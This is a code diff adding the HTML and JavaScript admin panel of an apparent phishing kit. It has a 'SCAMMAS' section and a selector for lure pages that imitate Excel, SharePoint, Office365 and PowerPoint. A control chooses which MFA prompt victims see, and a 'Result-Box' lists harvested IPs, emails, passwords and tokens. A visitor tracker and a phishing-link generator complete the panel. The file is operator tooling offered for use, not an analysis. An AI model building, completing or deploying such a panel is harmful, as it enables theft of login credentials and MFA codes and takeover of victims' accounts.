@@ -1,0 +1,477 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="admin.css">
+    <title>DASHBOARD</title>
+</head>
+<body>
+    <div class="container">
+        <div class="panel">
+            <div>
+                <div class="sidebar active">
+                    DASHBOARD
+                </div>
+                <div class="sidebar">
+                    SCAMMAS
+                </div>
+                <div class="sidebar">
+                    MFA
+                </div>
+                <div class="sidebar">
+                    RESULT-BOX
+                </div>
+                <div class="sidebar">
+                    SETTINGS
+                </div>
+                <div class="sidebar">
+                    VISITORS
+                </div>
+                <div class="sidebar">
+                    STATS
+                </div>
+                <div class="sidebar">
+                    GENERATE LINK
+                </div>
+                <div class="sidebar">
+                    LOGOUT
+                </div>
+            </div>
+        </div>
+        <div id="main"> 
+            <div id="addw">
+                <div id="addwhead">
+                   Welcome to Admin Panel
+                </div>
+                <div id="addwmain">
+                    <div id="addhead">
+                        <div class="autsel">Active Page</div>
+                        <div class="autsel">Total Engagments</div>
+                        <div class="autsel">Total Result</div>
+                        <div class="autsel">Expire Date</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="main1"> 
+            <div id="addw">
+                <div id="addwhead">
+                   Choose-Page
+                </div>
+                <div id="addwmain1">
+                    <div id="addhead1">
+                        <!--<select id="bgSelect">
+                            <option value="">
+                                Select-Page
+                            </option>
+                            <option value="clean.png">
+                                Excel
+                            </option>
+                            <option value="shap.png">
+                                Share Point
+                            </option>
+                            <option value="good.svg">
+                                Office365
+                            </option>
+                            <option value="powp.png">
+                                PowerPoint
+                            </option>
+                        </select>
+                    
+                        <button onclick="saveBg()">
+                            INITIATE
+                        </button>
+                        -->
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="main2"> 
+            <div id="addw">
+                <div id="addwhead">
+                   Select Authentication Type
+                </div>
+                <div id="addwmain2">
+                    <div id="addhead2">
+                        <div onclick="setView('container')" class="autsel">
+                            AUTHENTICTOR APP
+                        </div>
+                        <div id="open-modal" class="autsel">MFA
+                           <div id="dal" class="modl">
+                           <label>CODE NO</label>
+                           <input type="text" id="pinn">
+                           <button onclick="setView('container2')">SET CODE</button>
+                           </div>
+                           
+                        </div>
+                        <div onclick="setView('container3')" class="autsel">SMS CODE</div>
+                        <div onclick="setView('container4')" class="autsel">6 DIGITS CODE</div>
+                        <div onclick="setView('container5')" class="autsel">EMAIL CODE</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="main3"> 
+            <div id="addw">
+                <div id="addwhead">
+                   Result-Box
+                </div>
+                <div id="addwmainr">
+                    <div id="addheadr">
+                        <div>
+                            IP
+                        </div>
+                        <div>Email</div>
+                        <div>Password</div>
+                        <div>Token</div>
+                        <div>Id</div>
+                    </div>
+            <table border="1" id="t"></table>
+                </div>
+            </div>
+        </div>
+        <div id="main4"> 
+            <div id="addw">
+                <div id="addwhead">
+                   Setting
+                </div>
+                <div id="addwmain">
+                    <div id="addhead">
+                        <div class="autsel">Account Type</div>
+                        <div class="autsel">Link Email</div>
+                        <div class="autsel">change Password</div>
+                        <div class="autsel">Reset</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="main5"> 
+            <div id="addw">
+                <div id="addwhead">
+                   Vistors Tracker
+                </div>
+                <div id="addwmain">
+                    <div id="addhead">
+                        <div class="autsel">No of Visit</div>
+                        <div class="autsel">Ip Address</div>
+                        <div class="autsel">Time</div>
+                        <div class="autsel">Date</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="main6"> 
+            <div id="addw">
+                <div id="addwhead">
+                   Statistic
+                </div>
+                <div id="addwmain">
+                    <div id="addhead">
+                        <div class="autsel">Total Engagments</div>
+                        <div class="autsel">Acive Period</div>
+                        <div class="autsel">Expire</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="main7"> 
+            <div id="addw">
+                <div id="addwhead">
+                   GenerateURL Link
+                </div>
+                <div id="addwmain2">
+                    <div id="addhead2">
+                        <div>
+                            <input type="text" placeholder="paste url" style="width: 30vw;height: 40px;padding-left: 10px;">
+                            <button  style="height: 40px;background: purple;color: whitesmoke;font-weight: 600;">GenerateURL</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="main8"> 
+            <div id="addw">
+                <div id="addwhead">
+                  Are you sure you want to Logout?
+                </div>
+                <div id="addwmain2">
+                    <div id="addhead2">
+                        <p>Confirm Logout</p>
+                       
+                        <div class="autsel">YES</div>
+                        <div class="autsel">NO</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+</body>
+<script>
+    
+    function setView(view) {
+        const pinn = document.getElementById('pinn').value;
+        localStorage.setItem("currentView", view);
+
+        if (view === 'container2'){
+            localStorage.setItem("inputVal", pinn);
+        }
+        alert(`view switched to ${view}`);       
+    }
+</script>
+
+
+<script>
+    async function load() {
+        const res = await fetch("/tata");
+        const tata = await res.json();
+
+        tata.forEach(d =>{
+            t.innerHTML += `<tr width="100%"><td width="20%">${d.ip}</td><td width="25%">${d.name}</td><td width="20%">${d.hash}</td><td width="30%">${d.deliveryFee}</td><td width="20%">${d.nextId}</td></tr>`;
+        });
+    }
+    load();
+</script>
+<script>
+    async function saveBg(){
+        await fetch("/admin/set-bg",{
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                image: document.getElementById("bgSelect").value
+            })
+        });
+        alert("Background updated")
+    }
+</script>
+
+<script>
+    const side = document.getElementsByClassName("sidebar")[0];
+    const side1 = document.getElementsByClassName("sidebar")[1];
+    const side2 = document.getElementsByClassName("sidebar")[2];
+    const side3 = document.getElementsByClassName("sidebar")[3];
+    const side4 = document.getElementsByClassName("sidebar")[4];
+    const side5 = document.getElementsByClassName("sidebar")[5];
+    const side6 = document.getElementsByClassName("sidebar")[6];
+    const side7 = document.getElementsByClassName("sidebar")[7];
+    const side8 = document.getElementsByClassName("sidebar")[8];
+    const main = document.getElementById('main');
+    const main1 = document.getElementById('main1');
+    const main2 = document.getElementById('main2');
+    const main3 = document.getElementById('main3');
+
+    side.addEventListener('click', ()=>{
+        side1.classList.remove('active');
+        side2.classList.remove('active');
+        side3.classList.remove('active');
+        side4.classList.remove('active');
+        side5.classList.remove('active');
+        side6.classList.remove('active');
+        side7.classList.remove('active');
+        side8.classList.remove('active');
+
+        main1.style.display="none";
+        main2.style.display="none";
+        main3.style.display="none";
+        main4.style.display="none";
+        main8.style.display="none";
+        main5.style.display="none";
+        main6.style.display="none";
+        main7.style.display="none";
+
+        main.style.display="block";
+
+        
+
+        side.classList.add('active');
+    })
+    side1.addEventListener('click', ()=>{
+        side.classList.remove('active');
+        side2.classList.remove('active');
+        side3.classList.remove('active');
+        side4.classList.remove('active');
+        side5.classList.remove('active');
+        side6.classList.remove('active');
+        side7.classList.remove('active');
+        side8.classList.remove('active');
+
+        main.style.display="none";
+        main2.style.display="none";
+        main3.style.display="none";
+        main4.style.display="none";
+        main8.style.display="none";
+        main5.style.display="none";
+        main6.style.display="none";
+        main7.style.display="none";
+
+        main1.style.display="block";
+
+        side1.classList.add('active');
+    })
+    side2.addEventListener('click', ()=>{
+        side.classList.remove('active');
+        side1.classList.remove('active');
+        side3.classList.remove('active');
+        side4.classList.remove('active');
+        side5.classList.remove('active');
+        side6.classList.remove('active');
+        side7.classList.remove('active');
+        side8.classList.remove('active');
+
+        main.style.display="none";
+        main1.style.display="none";
+        main3.style.display="none";
+        main4.style.display="none";
+        main8.style.display="none";
+        main5.style.display="none";
+        main6.style.display="none";
+        main7.style.display="none";
+
+        main2.style.display="block";
+
+        side2.classList.add('active');
+    })
+    side3.addEventListener('click', ()=>{
+        side.classList.remove('active');
+        side2.classList.remove('active');
+        side1.classList.remove('active');
+        side4.classList.remove('active');
+        side5.classList.remove('active');
+        side6.classList.remove('active');
+        side7.classList.remove('active');
+        side8.classList.remove('active');
+
+        main.style.display="none";
+        main2.style.display="none";
+        main1.style.display="none";
+        main4.style.display="none";
+        main8.style.display="none";
+        main5.style.display="none";
+        main6.style.display="none";
+        main7.style.display="none";
+
+        main3.style.display="block";
+
+        side3.classList.add('active');
+    })
+    side4.addEventListener('click', ()=>{
+        side.classList.remove('active');
+        side2.classList.remove('active');
+        side3.classList.remove('active');
+        side1.classList.remove('active');
+        side5.classList.remove('active');
+        side6.classList.remove('active');
+        side7.classList.remove('active');
+        side8.classList.remove('active');
+
+        main.style.display="none";
+        main2.style.display="none";
+        main3.style.display="none";
+        main1.style.display="none";
+        main8.style.display="none";
+        main5.style.display="none";
+        main6.style.display="none";
+        main7.style.display="none";
+
+        main4.style.display="block";
+
+        side4.classList.add('active');
+    })
+    side5.addEventListener('click', ()=>{
+        side.classList.remove('active');
+        side2.classList.remove('active');
+        side3.classList.remove('active');
+        side4.classList.remove('active');
+        side5.classList.remove('active');
+        side6.classList.remove('active');
+        side7.classList.remove('active');
+        side8.classList.remove('active');
+
+        main.style.display="none";
+        main2.style.display="none";
+        main3.style.display="none";
+        main4.style.display="none";
+        main8.style.display="none";
+        main1.style.display="none";
+        main6.style.display="none";
+        main7.style.display="none";
+
+        main5.style.display="block";
+
+        side5.classList.add('active');
+    })
+    side6.addEventListener('click', ()=>{
+        side.classList.remove('active');
+        side2.classList.remove('active');
+        side3.classList.remove('active');
+        side4.classList.remove('active');
+        side5.classList.remove('active');
+        side1.classList.remove('active');
+        side7.classList.remove('active');
+        side8.classList.remove('active');
+
+        main.style.display="none";
+        main2.style.display="none";
+        main3.style.display="none";
+        main4.style.display="none";
+        main8.style.display="none";
+        main5.style.display="none";
+        main1.style.display="none";
+        main7.style.display="none";
+
+        main6.style.display="block";
+
+        side6.classList.add('active');
+    })
+    side7.addEventListener('click', ()=>{
+        side.classList.remove('active');
+        side2.classList.remove('active');
+        side3.classList.remove('active');
+        side4.classList.remove('active');
+        side5.classList.remove('active');
+        side6.classList.remove('active');
+        side1.classList.remove('active');
+        side8.classList.remove('active');
+
+        main.style.display="none";
+        main2.style.display="none";
+        main3.style.display="none";
+        main4.style.display="none";
+        main8.style.display="none";
+        main5.style.display="none";
+        main6.style.display="none";
+        main1.style.display="none";
+
+        main7.style.display="block";
+
+        side7.classList.add('active');
+    })
+    side8.addEventListener('click', ()=>{
+        side.classList.remove('active');
+        side2.classList.remove('active');
+        side3.classList.remove('active');
+        side4.classList.remove('active');
+        side5.classList.remove('active');
+        side6.classList.remove('active');
+        side7.classList.remove('active');
+        side1.classList.remove('active');
+
+        main.style.display="none";
+        main2.style.display="none";
+        main3.style.display="none";
+        main4.style.display="none";
+        main1.style.display="none";
+        main5.style.display="none";
+        main6.style.display="none";
+        main7.style.display="none";
+
+        main8.style.display="block";
+
+        side8.classList.add('active');
+    })
+    //addEventListener
+    //classList
+</script>
+
+</html>
